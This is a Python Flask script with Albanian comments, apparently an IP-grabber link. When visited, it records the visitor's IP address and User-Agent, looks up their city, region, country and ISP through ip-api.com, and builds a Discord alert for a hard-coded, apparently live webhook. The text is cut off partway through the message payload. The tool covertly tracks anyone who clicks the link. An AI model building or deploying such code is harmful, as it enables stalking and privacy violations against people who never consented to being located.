
import requests
from flask import Flask, request, redirect
import os

app = Flask(__name__)

# Webhook-u yt i dërguar
WEBHOOK_URL = "https://discord.com/api/webhooks/1497922213599510530/7Dn_lC_eSr50o09dbLevPAnhDROVKrdhEd-hHPjGy_ZCLjMY-NZqm08cpnt7CQNaT5LZ"

@app.route('/')
def main():
    # Identifikimi i IP-së reale të vizitorit
    if request.headers.getlist("X-Forwarded-For"):
        ip = request.headers.getlist("X-Forwarded-For")[0]
    else:
        ip = request.remote_addr

    # Identifikimi i pajisjes (iPhone, Android, etj.)
    user_agent = request.headers.get('User-Agent')

    # Marrja e informacioneve gjeografike nga një API e jashtme
    try:
        geo_res = requests.get(f"http://ip-api.com/json/{ip}")
        geo_data = geo_res.json()
        country = geo_data.get('country', 'E panjohur')
        city = geo_data.get('city', 'I panjohur')
        region = geo_data.get('regionName', 'I panjohur')
        isp = geo_data.get('isp', 'I panjohur')
    except Exception:
        country = city = region = isp = "Nuk u morën dot të dhënat"

    # Ndërtimi i mesazhit vizual për Discord (Embed)
    payload = {
        "content": "🚨 **Njoftim: IP e re u regjistrua!** @everyone",
        "embeds": [
            {
                "title": "Detajet e Vizitorit",
                "description": "Një përdorues sapo klikoi linkun tënd.",
                "color": 15158332, # Ngjyrë e kuqe
                "fields": [
                    {"name": "🌐 Adresa IP", "value": f"`{ip}`", "inline": True},
                    {"name": "📍 Vendndodhja", "value": f"{city}, {region}, {country}", "inline": True},
                    {"name": "📡 Operatori (ISP)", "value": f"{isp}", "inline": False},
                    {"name": "📱 Pajisja dhe Browseri", "value": f"

